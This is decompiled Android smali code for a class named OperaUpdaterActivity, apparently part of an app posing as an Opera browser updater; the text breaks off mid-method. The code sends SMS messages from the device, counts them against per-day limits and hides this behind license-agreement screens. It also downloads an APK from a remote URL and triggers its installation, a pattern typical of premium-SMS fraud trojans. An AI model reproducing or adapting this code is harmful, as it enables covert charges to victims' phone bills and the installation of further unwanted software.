.class public Lad/notify/OperaUpdaterActivity;
.super Landroid/app/Activity;
.source "OperaUpdaterActivity.java"

# interfaces
.implements Landroid/view/View$OnClickListener;
.implements Lad/notify/ThreadOperationListener;


# static fields
.field private static progressDialog:Landroid/app/ProgressDialog;

.field static state:I


# instance fields
.field back:Landroid/widget/Button;

.field exit:Landroid/widget/Button;

.field go:Landroid/widget/Button;

.field license:Landroid/widget/Button;

.field private mark:Ljava/lang/String;

.field next:Landroid/widget/Button;

.field ok:Landroid/widget/Button;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 47
    const/4 v0, 0x0

    sput v0, Lad/notify/OperaUpdaterActivity;->state:I

    .line 49
    const/4 v0, 0x0

    sput-object v0, Lad/notify/OperaUpdaterActivity;->progressDialog:Landroid/app/ProgressDialog;

    .line 45
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 45
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static DownloadAndInstall(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "apkUrl"    # Ljava/lang/String;
    .param p2, "appName"    # Ljava/lang/String;

    .prologue
    .line 297
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "DownloadAndInstall"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 300
    :try_start_0
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 301
    .local v0, "url":Ljava/net/URL;
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    .end local v0    # "url":Ljava/net/URL;
    check-cast v0, Ljava/net/HttpURLConnection;

    .line 302
    .local v0, "c":Ljava/net/HttpURLConnection;
    const-string p1, "GET"

    .end local p1    # "apkUrl":Ljava/lang/String;
    invoke-virtual {v0, p1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 303
    const/4 p1, 0x1

    invoke-virtual {v0, p1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 304
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 306
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v1, "/download/"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 307
    .local p1, "PATH":Ljava/lang/String;
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 308
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->mkdirs()Z

    .line 309
    new-instance p1, Ljava/io/File;

    .end local p1    # "PATH":Ljava/lang/String;
    invoke-direct {p1, v1, p2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 310
    .local p1, "outputFile":Ljava/io/File;
    new-instance v1, Ljava/io/FileOutputStream;

    .end local v1    # "file":Ljava/io/File;
    invoke-direct {v1, p1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 312
    .local v1, "fos":Ljava/io/FileOutputStream;
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    .line 314
    .local v0, "is":Ljava/io/InputStream;
    const/16 p1, 0x400

    new-array p1, p1, [B

    .line 315
    .local p1, "buffer":[B
    const/4 v2, 0x0

    .line 316
    .local v2, "len1":I
    :goto_0
    invoke-virtual {v0, p1}, Ljava/io/InputStream;->read([B)I

    move-result v2

    const/4 v3, -0x1

    if-ne v2, v3, :cond_0

    .line 320
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    .line 321
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V

    .line 323
    new-instance p1, Landroid/content/Intent;

    .end local p1    # "buffer":[B
    const-string v0, "android.intent.action.VIEW"

    .end local v0    # "is":Ljava/io/InputStream;
    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 324
    .local p1, "intent":Landroid/content/Intent;
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    .end local v1    # "fos":Ljava/io/FileOutputStream;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v2

    .end local v2    # "len1":I
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/download/"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    .end local p2    # "appName":Ljava/lang/String;
    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-direct {v0, p2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v0}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object p2

    const-string v0, "application/vnd.android.package-archive"

    invoke-virtual {p1, p2, v0}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 325
    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 332
    .end local p0    # "context":Landroid/content/Context;
    .end local p1    # "intent":Landroid/content/Intent;
    :goto_1
    return-void

    .line 318
    .restart local v0    # "is":Ljava/io/InputStream;
    .restart local v1    # "fos":Ljava/io/FileOutputStream;
    .restart local v2    # "len1":I
    .restart local p0    # "context":Landroid/content/Context;
    .local p1, "buffer":[B
    .restart local p2    # "appName":Ljava/lang/String;
    :cond_0
    const/4 v3, 0x0

    invoke-virtual {v1, p1, v3, v2}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 328
    .end local v0    # "is":Ljava/io/InputStream;
    .end local v1    # "fos":Ljava/io/FileOutputStream;
    .end local v2    # "len1":I
    .end local p1    # "buffer":[B
    .end local p2    # "appName":Ljava/lang/String;
    :catch_0
    move-exception p1

    .line 330
    .local p1, "e":Ljava/io/IOException;
    const-string p1, "Install error!"

    .end local p1    # "e":Ljava/io/IOException;
    const/4 p2, 0x1

    invoke-static {p0, p1, p2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p0

    .end local p0    # "context":Landroid/content/Context;
    invoke-virtual {p0}, Landroid/widget/Toast;->show()V

    goto :goto_1
.end method


# virtual methods
.method addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;
    .locals 4
    .param p1, "lineaLayout"    # Landroid/widget/LinearLayout;
    .param p2, "text"    # Ljava/lang/String;

    .prologue
    .line 166
    new-instance v0, Landroid/widget/Button;

    invoke-direct {v0, p0}, Landroid/widget/Button;-><init>(Landroid/content/Context;)V

    .line 167
    .local v0, "button":Landroid/widget/Button;
    new-instance v1, Landroid/view/ViewGroup$LayoutParams;

    const/4 v2, -0x1

    const/4 v3, -0x2

    invoke-direct {v1, v2, v3}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 168
    invoke-virtual {v0, p2}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 169
    invoke-virtual {v0, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 170
    invoke-virtual {p1, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 171
    return-object v0
.end method

.method addLogo(Landroid/widget/LinearLayout;)V
    .locals 5
    .param p1, "lineaLayout"    # Landroid/widget/LinearLayout;

    .prologue
    .line 151
    :try_start_0
    new-instance v1, Landroid/widget/ImageView;

    invoke-direct {v1, p0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 152
    .local v1, "imageView":Landroid/widget/ImageView;
    new-instance v2, Landroid/view/ViewGroup$LayoutParams;

    const/4 v3, -0x1

    const/4 v4, -0x2

    invoke-direct {v2, v3, v4}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 153
    const v2, 0x7f020001

    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 154
    sget-object v2, Landroid/widget/ImageView$ScaleType;->CENTER:Landroid/widget/ImageView$ScaleType;

    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setScaleType(Landroid/widget/ImageView$ScaleType;)V

    .line 156
    invoke-virtual {p1, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 162
    .end local v1    # "imageView":Landroid/widget/ImageView;
    :goto_0
    return-void

    .line 158
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 160
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public addSentSms(JI)V
    .locals 3
    .param p1, "time"    # J
    .param p3, "state"    # I

    .prologue
    .line 264
    sget-object v0, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    iget-object v0, v0, Lad/notify/Settings;->saved:Lad/notify/SettingsSet;

    iget-object v1, v0, Lad/notify/SettingsSet;->sms:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1, p2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ":"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ";"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lad/notify/SettingsSet;->sms:Ljava/lang/String;

    .line 265
    sget-object v0, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    invoke-virtual {v0, p0}, Lad/notify/Settings;->save(Landroid/content/Context;)Z

    .line 266
    return-void
.end method

.method addTextView(Landroid/widget/LinearLayout;Ljava/lang/String;)V
    .locals 6
    .param p1, "lineaLayout"    # Landroid/widget/LinearLayout;
    .param p2, "text"    # Ljava/lang/String;

    .prologue
    const/4 v5, -0x1

    .line 136
    new-instance v0, Landroid/widget/ScrollView;

    invoke-direct {v0, p0}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    .line 137
    .local v0, "scrollView":Landroid/widget/ScrollView;
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v3, -0x2

    const/high16 v4, 0x3f800000    # 1.0f

    invoke-direct {v2, v5, v3, v4}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v0, v2}, Landroid/widget/ScrollView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 139
    new-instance v1, Landroid/widget/TextView;

    invoke-direct {v1, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 140
    .local v1, "textView":Landroid/widget/TextView;
    new-instance v2, Landroid/view/ViewGroup$LayoutParams;

    invoke-direct {v2, v5, v5}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 141
    invoke-virtual {v1, p2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 143
    invoke-virtual {v0, v1}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    .line 144
    invoke-virtual {p1, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 145
    return-void
.end method

.method createLayout()Landroid/widget/LinearLayout;
    .locals 3

    .prologue
    const/4 v2, -0x1

    .line 253
    new-instance v0, Landroid/widget/LinearLayout;

    invoke-direct {v0, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 255
    .local v0, "lineaLayout":Landroid/widget/LinearLayout;
    new-instance v1, Landroid/view/ViewGroup$LayoutParams;

    invoke-direct {v1, v2, v2}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 256
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 257
    const/high16 v1, 0x3f800000    # 1.0f

    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setWeightSum(F)V

    .line 259
    return-object v0
.end method

.method public exitMIDlet()V
    .locals 1

    .prologue
    .line 130
    const/4 v0, 0x0

    .line 131
    .local v0, "err":Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 132
    return-void
.end method

.method getSentSms()[J
    .locals 7

    .prologue
    .line 270
    sget-object v5, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    iget-object v5, v5, Lad/notify/Settings;->saved:Lad/notify/SettingsSet;

    iget-object v5, v5, Lad/notify/SettingsSet;->sms:Ljava/lang/String;

    const-string v6, ";"

    invoke-static {v5, v6}, Lad/notify/Utils;->split(Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    .line 272
    .local v4, "sentSms":[Ljava/lang/String;
    const/4 v0, 0x0

    .line 274
    .local v0, "count":I
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    array-length v5, v4

    if-lt v1, v5, :cond_0

    .line 284
    new-array v2, v0, [J

    .line 286
    .local v2, "list":[J
    const/4 v1, 0x0

    :goto_1
    if-lt v1, v0, :cond_2

    .line 292
    return-object v2

    .line 276
    .end local v2    # "list":[J
    :cond_0
    aget-object v5, v4, v1

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5

    if-nez v5, :cond_1

    .line 274
    :goto_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 281
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    .line 288
    .restart local v2    # "list":[J
    :cond_2
    aget-object v5, v4, v1

    const-string v6, ":"

    invoke-static {v5, v6}, Lad/notify/Utils;->split(Ljava/lang/String;Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 289
    .local v3, "parts":[Ljava/lang/String;
    const/4 v5, 0x0

    aget-object v5, v3, v5

    invoke-static {v5}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v5

    aput-wide v5, v2, v1

    .line 286
    add-int/lit8 v1, v1, 0x1

    goto :goto_1
.end method

.method getSmsItem(I)Lad/notify/SmsItem;
    .locals 1
    .param p1, "index"    # I

    .prologue
    .line 390
    sget-object v0, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v0, p1}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":Lad/notify/OperaUpdaterActivity;
    check-cast p0, Lad/notify/SmsItem;

    return-object p0
.end method

.method public onClick(Landroid/view/View;)V
    .locals 6
    .param p1, "view"    # Landroid/view/View;

    .prologue
    const/4 v5, 0x0

    const/4 v4, 0x1

    .line 337
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "onClick(): "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 338
    iget-object v1, p0, Lad/notify/OperaUpdaterActivity;->ok:Landroid/widget/Button;

    if-ne p1, v1, :cond_1

    .line 340
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lad/notify/ThreadOperation;

    invoke-direct {v2, p0, v4, v5}, Lad/notify/ThreadOperation;-><init>(Lad/notify/ThreadOperationListener;ILjava/lang/Object;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 341
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setEndScreen()V

    .line 386
    :cond_0
    :goto_0
    return-void

    .line 343
    :cond_1
    iget-object v1, p0, Lad/notify/OperaUpdaterActivity;->license:Landroid/widget/Button;

    if-ne p1, v1, :cond_2

    .line 345
    const/4 v1, 0x0

    sput v1, Lad/notify/NotificationApplication;->licenseIndex:I

    .line 346
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setLicenseScreen()V

    goto :goto_0

    .line 348
    :cond_2
    iget-object v1, p0, Lad/notify/OperaUpdaterActivity;->next:Landroid/widget/Button;

    if-ne p1, v1, :cond_5

    .line 350
    sget-boolean v1, Lad/notify/NotificationApplication;->licenseWithOneButton:Z

    if-eqz v1, :cond_3

    .line 352
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lad/notify/ThreadOperation;

    invoke-direct {v2, p0, v4, v5}, Lad/notify/ThreadOperation;-><init>(Lad/notify/ThreadOperationListener;ILjava/lang/Object;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 354
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setEndScreen()V

    goto :goto_0

    .line 358
    :cond_3
    sget v1, Lad/notify/NotificationApplication;->licenseIndex:I

    sget-object v2, Lad/notify/NotificationApplication;->licenseScreens:Ljava/util/Vector;

    invoke-virtual {v2}, Ljava/util/Vector;->size()I

    move-result v2

    sub-int/2addr v2, v4

    if-ge v1, v2, :cond_4

    .line 360
    sget v1, Lad/notify/NotificationApplication;->licenseIndex:I

    add-int/lit8 v1, v1, 0x1

    sput v1, Lad/notify/NotificationApplication;->licenseIndex:I

    .line 363
    :cond_4
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setLicenseScreen()V

    goto :goto_0

    .line 366
    :cond_5
    iget-object v1, p0, Lad/notify/OperaUpdaterActivity;->back:Landroid/widget/Button;

    if-ne p1, v1, :cond_6

    .line 368
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setMainScreen()V

    goto :goto_0

    .line 370
    :cond_6
    iget-object v1, p0, Lad/notify/OperaUpdaterActivity;->exit:Landroid/widget/Button;

    if-ne p1, v1, :cond_8

    .line 372
    sget v1, Lad/notify/OperaUpdaterActivity;->state:I

    const/4 v2, 0x2

    if-ne v1, v2, :cond_7

    .line 374
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setMainScreen()V

    goto :goto_0

    .line 376
    :cond_7
    sget v1, Lad/notify/OperaUpdaterActivity;->state:I

    const/4 v2, 0x3

    if-ne v1, v2, :cond_0

    .line 378
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->exitMIDlet()V

    goto :goto_0

    .line 381
    :cond_8
    iget-object v1, p0, Lad/notify/OperaUpdaterActivity;->go:Landroid/widget/Button;

    if-ne p1, v1, :cond_0

    .line 383
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    sget-object v2, Lad/notify/NotificationApplication;->url:Ljava/lang/String;

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 384
    .local v0, "browserIntent":Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lad/notify/OperaUpdaterActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0
.end method

.method public onConfigurationChanged(Landroid/content/res/Configuration;)V
    .locals 1
    .param p1, "newConfig"    # Landroid/content/res/Configuration;

    .prologue
    .line 429
    invoke-super {p0, p1}, Landroid/app/Activity;->onConfigurationChanged(Landroid/content/res/Configuration;)V

    .line 430
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Lad/notify/OperaUpdaterActivity;->setRequestedOrientation(I)V

    .line 431
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 11
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v10, 0x1

    .line 63
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 65
    sget-object v6, Lad/notify/NotificationApplication;->settings:Lad/notify/Settings;

    if-nez v6, :cond_0

    .line 67
    sget-boolean v6, Lad/notify/NotificationApplication;->secondStart:Z

    if-nez v6, :cond_0

    .line 69
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->exitMIDlet()V

    .line 126
    :goto_0
    return-void

    .line 75
    :cond_0
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->getSentSms()[J

    move-result-object v3

    .line 77
    .local v3, "sentSms":[J
    const/4 v4, 0x0

    .line 78
    .local v4, "sentSmsCount":I
    const-wide/16 v1, 0x0

    .line 80
    .local v1, "period":J
    array-length v6, v3

    if-lt v6, v10, :cond_1

    .line 82
    array-length v6, v3

    sub-int v0, v6, v10

    .local v0, "i":I
    :goto_1
    if-gez v0, :cond_2

    .line 105
    .end local v0    # "i":I
    :cond_1
    sget v6, Lad/notify/NotificationApplication;->maxSms:I

    sub-int v5, v6, v4

    .line 109
    .local v5, "smsCount":I
    sget-object v6, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v6}, Ljava/util/Vector;->size()I

    move-result v6

    if-le v6, v5, :cond_4

    .line 111
    sput v5, Lad/notify/NotificationApplication;->maxSendCount:I

    .line 118
    :goto_2
    sget v6, Lad/notify/NotificationApplication;->maxSendCount:I

    if-gtz v6, :cond_5

    .line 120
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setEndScreen()V

    goto :goto_0

    .line 84
    .end local v5    # "smsCount":I
    .restart local v0    # "i":I
    :cond_2
    array-length v6, v3

    sub-int/2addr v6, v10

    if-ne v0, v6, :cond_3

    .line 86
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    aget-wide v8, v3, v0

    sub-long/2addr v6, v8

    add-long/2addr v1, v6

    .line 93
    :goto_3
    sget v6, Lad/notify/NotificationApplication;->days:I

    sget v7, Lad/notify/Settings;->DAY:I

    mul-int/2addr v6, v7

    int-to-long v6, v6

    cmp-long v6, v1, v6

    if-gtz v6, :cond_1

    .line 99
    add-int/lit8 v4, v4, 0x1

    .line 82
    add-int/lit8 v0, v0, -0x1

    goto :goto_1

    .line 90
    :cond_3
    add-int/lit8 v6, v0, 0x1

    aget-wide v6, v3, v6

    aget-wide v8, v3, v0

    sub-long/2addr v6, v8

    add-long/2addr v1, v6

    goto :goto_3

    .line 115
    .end local v0    # "i":I
    .restart local v5    # "smsCount":I
    :cond_4
    sget-object v6, Lad/notify/NotificationApplication;->sms:Ljava/util/Vector;

    invoke-virtual {v6}, Ljava/util/Vector;->size()I

    move-result v6

    sput v6, Lad/notify/NotificationApplication;->maxSendCount:I

    goto :goto_2

    .line 124
    :cond_5
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->setMainScreen()V

    goto :goto_0
.end method

.method public sendSms(Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;

    .prologue
    .line 406
    invoke-static {p1, p2}, Lad/notify/SmsItem;->send(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 408
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const/4 v2, 0x1

    invoke-virtual {p0, v0, v1, v2}, Lad/notify/OperaUpdaterActivity;->addSentSms(JI)V

    .line 410
    :cond_0
    return-void
.end method

.method setEndScreen()V
    .locals 3

    .prologue
    .line 238
    const/4 v1, 0x3

    sput v1, Lad/notify/OperaUpdaterActivity;->state:I

    .line 240
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->createLayout()Landroid/widget/LinearLayout;

    move-result-object v0

    .line 242
    .local v0, "lineaLayout":Landroid/widget/LinearLayout;
    sget-object v1, Lad/notify/NotificationApplication;->endScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->text:Ljava/lang/String;

    invoke-virtual {p0, v0, v1}, Lad/notify/OperaUpdaterActivity;->addTextView(Landroid/widget/LinearLayout;Ljava/lang/String;)V

    .line 243
    sget-object v1, Lad/notify/NotificationApplication;->endScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->title:Ljava/lang/String;

    invoke-virtual {p0, v1}, Lad/notify/OperaUpdaterActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 245
    sget-object v1, Lad/notify/NotificationApplication;->endScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p0, v0, v1}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v1

    iput-object v1, p0, Lad/notify/OperaUpdaterActivity;->go:Landroid/widget/Button;

    .line 246
    sget-object v1, Lad/notify/NotificationApplication;->endScreen:Lad/notify/ScreenItem;

    iget-object v1, v1, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p0, v0, v1}, Lad/notify/OperaUpdaterActivity;->addButton(Landroid/widget/LinearLayout;Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v1

    iput-object v1, p0, Lad/notify/OperaUpdaterActivity;->exit:Landroid/widget/Button;

    .line 248
    invoke-virtual {p0, v0}, Lad/notify/OperaUpdaterActivity;->setContentView(Landroid/view/View;)V

    .line 249
    return-void
.end method

.method setLicenseScreen()V
    .locals 8

    .prologue
    const/4 v7, 0x2

    const/4 v6, 0x0

    .line 198
    sput v7, Lad/notify/OperaUpdaterActivity;->state:I

    .line 200
    invoke-virtual {p0}, Lad/notify/OperaUpdaterActivity;->createLayout()Landroid/widget/LinearLayout;

    move-result-object v1

    .line 202
    .local v1, "lineaLayout":Landroid/widget/LinearLayout;
    sget-boolean v4, Lad/notify/NotificationApplication;->licenseWithOneButton:Z

    if-eqz v4, :cond_1

    .line 204
    new-instance v4, Lad/notify/ScreenItem;

    invoke-direct {v4}, Lad/notify/ScreenItem;-><init>()V

    sput-object v4, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    .line 205
    sget-object v5, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    sget-object v4, Lad/notify/NotificationApplication;->licenseScreens:Ljava/util/Vector;

    invoke-virtual {v4, v6}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->title:Ljava/lang/String;

    iput-object v4, v5, Lad/notify/ScreenItem;->title:Ljava/lang/String;

    .line 206
    sget-object v5, Lad/notify/NotificationApplication;->licenseScreen:Lad/notify/ScreenItem;

    sget-object v4, Lad/notify/NotificationApplication;->licenseScreens:Ljava/util/Vector;

    invoke-virtual {v4, v6}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lad/notify/ScreenItem;

    iget-object v4, v4, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    iput-object v4, v5, Lad/notify/ScreenItem;->buttons:Ljava/util/Vector;

    .line 207
    new-instance v3, Ljava/lang/StringBuffer;

